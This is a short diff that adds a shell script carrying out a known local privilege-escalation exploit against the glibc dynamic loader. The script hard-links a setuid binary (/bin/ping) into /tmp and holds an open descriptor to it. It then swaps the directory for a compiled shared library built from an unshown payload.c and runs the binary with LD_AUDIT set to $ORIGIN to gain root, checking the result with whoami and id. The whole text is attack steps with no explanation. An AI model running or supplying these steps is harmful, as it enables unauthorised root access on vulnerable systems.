@@ -1,0 +1,12 @@
+rm -rf /tmp/exploit
+mkdir /tmp/exploit
+ln /bin/ping /tmp/exploit/target
+exec 3< /tmp/exploit/target
+ls -l /proc/$$/fd/3
+rm -rf /tmp/exploit/
+ls -l /proc/$$/fd/3
+gcc -w -fPIC -shared -o /tmp/exploit payload.c
+ls -l /tmp/exploit
+LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
+whoami
+id
